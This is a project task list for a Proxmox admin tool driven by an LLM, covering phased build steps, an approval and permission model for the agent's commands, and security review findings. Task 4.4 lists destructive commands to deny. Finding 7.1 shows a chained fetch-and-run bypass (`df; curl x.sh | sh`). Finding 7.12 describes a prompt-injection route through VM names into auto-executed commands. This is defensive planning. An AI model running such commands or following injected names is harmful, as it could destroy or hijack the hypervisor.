# proxmox-ai — Task List

## Phase 1 — Backend CT + Skeleton
- [ ] 1.1  Provision Debian 13 CT "proxmox-ai" on node01 (192.168.1.XXX, 2c / 2GB / 8GB)
- [ ] 1.2  Update CT, install Python 3.12 + venv + git + SQLite
- [ ] 1.3  Scaffold `proxmox-ai/backend/` (app.py, config.py, auth.py, permissions.py, providers/, pve_api.py, ssh_exec.py, guest_exec.py, context.py, tasks.py, audit.py, sessions.py)
- [ ] 1.4  Create `/etc/proxmox-ai/config.json` (chmod 600) — ALL toggles default false, ssh_mode=off, only local vLLM provider seeded
- [ ] 1.5  Implement `auth.py` — validate PVEAuthCookie against /api2/json, require admin perms; settings endpoints require root@pam
- [ ] 1.6  Implement `GET /health`
- [ ] 1.7  systemd unit `proxmox-ai.service` (port 9000, LAN-only, restart on-failure)
- [ ] 1.8  Verify: health ok with valid PVE session; 401 without

## Phase 2 — LLM Provider Layer
- [ ] 2.1  `providers/base.py` — abstract chat(), models(), health()
- [ ] 2.2  `providers/vllm.py` (OpenAI-compatible + Bearer)
- [ ] 2.3  `providers/compatible.py` (generic baseURL + key)
- [ ] 2.4  `providers/ollama.py` (/api/chat)
- [ ] 2.5  `providers/llamacpp.py`
- [ ] 2.6  `providers/openai.py`
- [ ] 2.7  `providers/anthropic.py` (messages API)
- [ ] 2.8  `providers/openrouter.py`
- [ ] 2.9  `POST /chat` — route to active provider, stream SSE
- [ ] 2.10 `GET/PUT /config` — provider CRUD + active selection; mask API keys
- [ ] 2.11 Seed local vLLM provider (192.168.1.XXX:8000/v1, qwen3-30b-a3b, key from vllm.service)
- [ ] 2.12 `sessions.py` — SQLite conversation persistence; list/resume/delete endpoints
- [ ] 2.13 Verify: `/chat` streams from local vLLM; session survives reconnect

## Phase 3 — Administration Layer
- [ ] 3.1  Create PVE API token (root@pam!proxmox-ai, PVEAdmin) for backend→PVE calls
- [ ] 3.2  `pve_api.py` — REST client + typed helpers (nodes, VMs, CTs, storage, network, firewall, backups, users)
- [ ] 3.3  `context.py` — read-only cluster snapshot injected into system prompt; refresh command
- [ ] 3.4  `tasks.py` — UPID polling, progress events into chat stream
- [ ] 3.5  Generate per-node SSH keypairs; install pubkeys (node01 first; nodes map for cluster)
- [ ] 3.6  `ssh_exec.py` — paramiko + nodes map + approval state machine
- [ ] 3.7  `guest_exec.py` — qm agent exec + pct exec wrapper
- [ ] 3.8  Verify: "list VMs" via API; long op shows UPID progress; SSH round-trip to node01

## Phase 4 — Security Model
- [ ] 4.1  Master toggles: server_access, internet_access, online_providers, guest_exec
- [ ] 4.2  `permissions.py` — per-category matrix (read_status / vmct_lifecycle / storage / network_firewall / users / host_system / guest_exec), each off|confirm|allow
- [ ] 4.3  SSH mode: off | confirm | allowlist+confirm | auto; allowlist = read-only verbs
- [ ] 4.4  Hard denylist (ALWAYS require approval, any mode): rm -rf, mkfs.*, dd of=, zpool destroy, wipefs, shutdown/poweroff/reboot, destroy --purge, iptables -F, passwd, userdel
- [ ] 4.5  Rate limiter (default 10 cmd/min) + session max duration (default 2h)
- [ ] 4.6  Kill switch: /etc/proxmox-ai/DISABLED file + UI toggle → instant 503 on all exec/chat
- [ ] 4.7  `audit.py` — append-only JSONL /var/log/proxmox-ai/audit.log (who/what/category/mode/decision/output/UPID) + logrotate
- [ ] 4.8  `GET /audit` endpoint
- [ ] 4.9  Verify: full matrix — categories, denylist floor in auto mode, kill switch, rate limit, toggle enforcement

## Phase 5 — UI Patch
- [ ] 5.1  `frontend/ai-panel.js` — ExtJS "AI" toolbar button + chat window
- [ ] 5.2  Streaming messages + input + session list/resume
- [ ] 5.3  Approval cards (command, target node/guest, category + denylist badges, Approve/Deny)
- [ ] 5.4  Task progress cards (UPID status)
- [ ] 5.5  `frontend/ai-settings.js` (root@pam only) — master toggles, category matrix grid, SSH mode radio, rate limits, kill switch
- [ ] 5.6  Provider editor (type/name/baseURL/apiKey/model/test-connection)
- [ ] 5.7  Audit viewer tab
- [ ] 5.8  `frontend/patch.sh` — backup + inject into pvemanagerlib.js, statics to /usr/share/pve-manager/js/ai/
- [ ] 5.9  dpkg hook `/etc/apt/apt.conf.d/99proxmox-ai-repatch`
- [ ] 5.10 Verify: button visible, chat works, non-admin PVE user gets 403, settings hidden for non-root
- [ ] 5.11 Verify: `apt reinstall pve-manager` → patch re-applied

## Phase 6 — Install + Docs
- [ ] 6.1  `install.sh` — one-shot: CT, backend, API token, SSH keys, patch; ends fully locked down except local chat
- [ ] 6.2  Uninstall path (remove patch, restore backup, stop service, revoke API token, remove SSH keys)
- [ ] 6.3  `README.md` — architecture, security model, permission matrix reference, uninstall
- [ ] 6.4  `docs/ct-setup.md`
- [ ] 6.5  Full end-to-end test from clean state
- [ ] 6.6  Negative tests: no session → 401; non-admin → 403; backend down → graceful UI error; DISABLED file → 503

## Phase 7 — Security Review Findings (2026-09-20)

### Critical
- [ ] 7.1  Allowlist bypass via command chaining — `is_allowlisted()` uses `re.search` with start-anchored patterns; `df; curl x.sh | sh` auto-runs. Reject shell metacharacters (`;` `&&` `||` `|` `` ` `` `$(` `>` `<` newline) before allowlist matching, or use `re.fullmatch` with `$`-anchored patterns (`permissions.py`)
- [ ] 7.2  Kill switch does not stop pending approvals — `kill_switch_active()` only checked in `/chat` and at request time; `/exec/{id}/approve` → `execute()` never re-checks. Check in `exec_approve` and at top of `ssh_exec.execute()` (`app.py`, `ssh_exec.py`)
- [ ] 7.3  No re-validation at execution time (TOCTOU) — `check_execution()` runs at request creation only; config changes between request and approval are ignored, rate limiter only consumed at request time. Re-run `check_execution()` in `execute()`/`exec_approve` (`ssh_exec.py`, `app.py`)

### High
- [ ] 7.4  Unquoted command embedding in guest-exec confirm path — `qm agent {vmid} exec -- {command}` / `pct exec {vmid} -- {command}` interpolated raw into host shell over SSH; metacharacters change the effective host-side command vs. what was approved. Wrap with `shlex.quote()` (`guest_exec.py`)
- [ ] 7.5  SSH host key verification disabled — `paramiko.AutoAddPolicy()` accepts any host key every connection (LAN MITM → root on hypervisor). Populate `known_hosts` at install time via `ssh-keyscan`, use `RejectPolicy()` (`ssh_exec.py`, `install.sh`)
- [ ] 7.6  TLS verification off by default for PVE API — `verify_tls: false` exposes API token + user PVEAuthCookies to MITM. Default `verify_tls: true`, document PVE CA install or cert pinning (`config.py`, `install.sh`, docs)
- [ ] 7.7  Installer grants unrestricted root SSH from CT to host — pubkey appended to `/root/.ssh/authorized_keys` with no `from=`/`command=`/`restrict`. Add restrictions or a forced-command wrapper; consider dedicated non-root user + sudoers (`install.sh`)
- [ ] 7.8  Hardcoded secret in repo — default `VLLM_KEY` committed in plaintext in `install.sh`. Rotate the key, remove the default, require the env var

### Medium
- [ ] 7.9  Exec requests not bound to creator — any admin can view/approve/deny another admin's pending request once the ID is known. Enforce `req.actor == user.name` or document shared-approval-queue design (`app.py`, `ssh_exec.py`)
- [ ] 7.10 Backend listens on `0.0.0.0:9000` plain HTTP — LAN-reachable without TLS; auth cookies cross LAN in cleartext. Bind to localhost behind socat, or firewall `:9000` to the PVE host (`config.py`, `install.sh`)
- [ ] 7.11 CORS wide open — `allow_origins=["*"]` with all methods/headers. Restrict to the PVE UI origin (`app.py`)
- [ ] 7.12 Prompt-injection → auto-exec path — cluster snapshot values (VM/CT/storage names) interpolated into system prompt unsanitized; malicious names can steer the LLM into emitting exec blocks. Strip backticks/newlines from snapshot values; document that `auto` mode trusts LLM output (`context.py`, docs)
- [ ] 7.13 Audit log + sessions DB permissions — `audit.log` (full commands, 4000 chars of output) and `sessions.db` (all chat content) inherit umask. Set `chmod 600` at creation (`audit.py`, `sessions.py`, `install.sh`)

### Low
- [ ] 7.14 `session_max_minutes` never enforced — sessions live forever (`config.py`, `sessions.py`)
- [ ] 7.15 Auth ticket cache 60 s TTL — revoked PVE tickets stay valid up to a minute; document or shorten (`auth.py`)
- [ ] 7.16 Global rate limiter — one user can starve others; per-actor buckets (`permissions.py`)
- [ ] 7.17 `_requests` dict never expires — pending/completed requests accumulate for process lifetime; add TTL eviction (`ssh_exec.py`)
- [ ] 7.18 `_has_admin_caps` parsing — verify admin detection fails closed for non-root admins (`auth.py`)
- [ ] 7.19 Docs recommend `--privsep 0` root API token — recommend dedicated `proxmox-ai@pve` user with least-privilege role instead (`docs/installation.md`)

## Backlog (v1.1+)
- [ ] B.1  Native tool-calling for vLLM/Qwen3 (Hermes parser)
- [ ] B.2  TLS for backend service
- [ ] B.3  RAG over cluster logs/status history
- [ ] B.4  Per-PVE-user AI permission profiles (beyond admin-only)
- [ ] B.5  Mobile-friendly panel